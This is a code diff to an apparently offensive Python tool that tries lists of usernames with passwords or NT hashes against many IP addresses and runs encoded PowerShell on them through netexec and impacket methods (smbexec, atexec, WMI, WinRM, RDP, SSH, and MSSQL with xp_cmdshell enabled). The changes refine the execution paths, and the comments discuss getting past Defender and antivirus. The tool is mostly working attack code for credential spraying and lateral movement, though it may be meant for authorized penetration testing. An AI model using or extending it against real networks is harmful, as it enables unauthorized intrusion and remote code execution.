@@ -22,7 +22,7 @@ TOOLS_SPECIFIED = False
 LINUX_MODE = False
 
 VALID_TOOLS = ["winrm", "smbexec", "wmi", "ssh", "mssql", "psexec", "atexec", "rdp"]
-NXC_TOOLS = {"smbexec", "ssh", "wmi", "rdp", "winrm", "winrm-ssl"}
+NXC_TOOLS = {"smbexec", "ssh", "wmi", "rdp", "winrm", "winrm-ssl", "atexec"}
 
 IMPACKET_PREFIX = "impacket-"  # or "" for .py suffix
 NXC_CMD = "nxc"
@@ -114,7 +114,7 @@ def load_credential_file(path):
     
     for i in range(0, len(filtered), 2):
         user = filtered[i].strip()
-        cred = filtered[i + 1]
+        cred = filtered[i + 1].strip()
         is_hash = is_nthash(cred)
         creds.append((user, cred, is_hash))
     
@@ -142,14 +142,15 @@ def parse_tools_list(tools_str):
 
 def check_port(ip, port, timeout=0.05):
     """Check if a port is open on the given IP."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(timeout)
         result = sock.connect_ex((ip, port))
-        sock.close()
         return result == 0
     except:
         return False
+    finally:
+        sock.close()
 
 def scan_ports_for_tools(ip, tool_list):
     """
@@ -204,17 +205,16 @@ def build_cmd(tool, user, target, credential, command, use_hash=False):
                 if use_hash else
                 f"{cmd} \"{user}\":{credential}@{target} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc {b64}'")
 
-    if tool == "atexec":
-        cmd = impacket_cmd("atexec")
-        return (f"{cmd} -hashes :{hash_val} \"{user}\"@{target} 'powershell -enc {b64}'"
-                if use_hash else
-                f"{cmd} \"{user}\":{credential}@{target} 'powershell -enc {b64}'")
-
     # NXC tools
     if tool == "smbexec":
         return (f"{NXC_CMD} smb {target} -H {hash_val} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
                 if use_hash else
                 f"{NXC_CMD} smb {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
+
+    if tool == "atexec":
+        return (f"{NXC_CMD} smb {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}' --exec-method atexec{nxc_output_flag}"
+                if use_hash else
+                f"{NXC_CMD} smb {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}' --exec-method atexec{nxc_output_flag}")
 
     if tool == "wmi":
         # we don't actually need to pass the --no-output here, as defender won't catch it with this specific `cmd /c "powershell -enc` combo
@@ -230,14 +230,14 @@ def build_cmd(tool, user, target, credential, command, use_hash=False):
         return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}"
 
     if tool == "winrm":
-        return (f"{NXC_CMD} winrm {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
+        return (f"{NXC_CMD} winrm {target} -u \"{user}\" -H {hash_val} --check-proto http --port 5985 -X 'powershell -enc {b64}'{nxc_output_flag}"
                 if use_hash else
-                f"{NXC_CMD} winrm {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")
-    
+                f"{NXC_CMD} winrm {target} -u \"{user}\" -p {credential} --check-proto http --port 5985 -X 'powershell -enc {b64}'{nxc_output_flag}")
+
     if tool == "winrm-ssl":
-        return (f"{NXC_CMD} winrm {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
+        return (f"{NXC_CMD} winrm {target} -u \"{user}\" -H {hash_val} --check-proto https --port 5986 -X 'powershell -enc {b64}'{nxc_output_flag}"
                 if use_hash else
-                f"{NXC_CMD} winrm {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")
+                f"{NXC_CMD} winrm {target} -u \"{user}\" -p {credential} --check-proto https --port 5986 -X 'powershell -enc {b64}'{nxc_output_flag}")
     
     if tool == "rdp":
         return (f"{NXC_CMD} rdp {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
@@ -281,7 +281,7 @@ def run_chain(user, ip, credential, command, use_hash=False, tool_list=None):
             rc = result.returncode
             out = result.stdout.decode("utf-8", errors="ignore")
             vprint(f"[v] Output for {tool} on {ip} (rc={rc}):")
-            if not out or out == '':
+            if not out:
                 vprint(f"(no output)")
             else:
                 vprint(out)
@@ -321,7 +321,7 @@ def run_chain(user, ip, credential, command, use_hash=False, tool_list=None):
                 safe_print(f"  [-] For {ip}: {tool} failed.")
                 continue
 
-        if tool in NXC_TOOLS or tool == "atexec":
+        if tool in NXC_TOOLS:
             if '[-]' in out:
                 if "Could not retrieve" in out:
                     safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but likely failed to run command. Try running without -o to avoid tripping AV.")
@@ -333,11 +333,11 @@ def run_chain(user, ip, credential, command, use_hash=False, tool_list=None):
                 safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but this seems like a Linux machine, so the command didn't run.")
                 safe_print("  \033[33m[!]\033[0m Use \033[33m--linux\033[0m to run command across Linux machines.")
                 continue
-            if '[+]' in out and '[+] Executed' not in out:
-                safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but seemingly failed to run command. Does the user have the necessary permissions?")
-                continue
             if '[+]' in out and 'Access is denied.' in out:
                 safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but permission was denied. Does the user have the necessary permissions?")
+                continue
+            if '[+]' in out and '[+] Executed' not in out:
+                safe_print(f"  \033[33m[!]\033[0m For {ip}: {tool} AUTHENTICATION succeeded as {user} with {credential}, but seemingly failed to run command. Does the user have the necessary permissions?")
                 continue
             if rc == 0 and out == "":
                 # nxc tools will sometimes just fail silently
@@ -399,8 +399,7 @@ def execute_on_ip(username, ip, credential, command, use_hash=False, tool_list=N
     if tool == "mssql":
         safe_print(f"\033[33m[!] WARNING: MSSQL used for command execution; xp_cmdshell is currently enabled on {ip}. \033[0m")
     oprint(out)
-    if not RUN_ALL:
-        return (ip, tool)
+    return (ip, tool)
 
 def parse_args():
     parser = argparse.ArgumentParser(
@@ -472,12 +471,13 @@ def check_dependencies():
     else:
         missing_tools.append("nxc")
 
-    if not missing_tools == []:
-        for tool in missing_tools:
-            if tool == "nxc":
-                print("[-] netexec not found. Install with: pipx install git+https://github.com/Pennyw0rth/NetExec")
-            if tool == "impacket" and not LINUX_MODE:
-                print("[-] impacket not found. Install with: pipx install impacket")
+    required_missing = [t for t in missing_tools if not (t == "impacket" and LINUX_MODE)]
+    for tool in required_missing:
+        if tool == "nxc":
+            print("[-] netexec not found. Install with: pipx install git+https://github.com/Pennyw0rth/NetExec")
+        if tool == "impacket":
+            print("[-] impacket not found. Install with: pipx install impacket")
+    if required_missing:
         sys.exit(1)
     
 def impacket_cmd(tool):
@@ -523,7 +523,7 @@ def main():
     if args.threads is not None:
         MAX_THREADS = max(args.threads, 1)
     else:
-        MAX_THREADS = min(10, len(ips))
+        MAX_THREADS = max(1, min(10, len(ips)))
 
     print(f"[*] Loaded {len(credential_list)} credential set(s)")
     print(f"[*] Processing {len(ips)} IPs with {MAX_THREADS} threads...")
